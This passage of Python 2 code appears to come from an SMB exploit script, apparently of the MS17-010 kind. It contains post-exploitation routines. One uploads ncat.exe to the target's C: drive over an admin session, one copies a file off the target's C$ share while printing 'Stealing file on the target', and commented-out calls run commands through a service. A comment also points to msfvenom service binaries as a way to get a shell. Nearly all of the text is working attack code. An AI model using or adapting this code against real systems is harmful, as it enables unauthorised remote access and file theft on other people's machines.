...
def smb_pwn(conn, arch):
	...
	#smb_get_file(smbConn)
	smb_send_file(smbConn, 'ncat.exe', 'C', '/ncat.exe')
	#smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
	#service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
	#service_exec(conn, r'dir') #ACCESS DENIED FOR ALL EXEC
	# Note: there are many methods to get shell over SMB admin session
	# a simple method to get shell (but easily to be detected by AV) is
	# executing binary generated by "msfvenom -f exe-service ..."'

def smb_get_file(smbConn):
	try:
		import ntpath
		filename = ntpath.basename('/exploit.py')
		fp = open(filename, 'wb')
		print('Stealing file on the target...')
		smbConn.getFile('C$', '/exploit.py', None, fp.write)
		print('closing file...')
		fp.close()
		print('Finished.')
	except Exception, e:
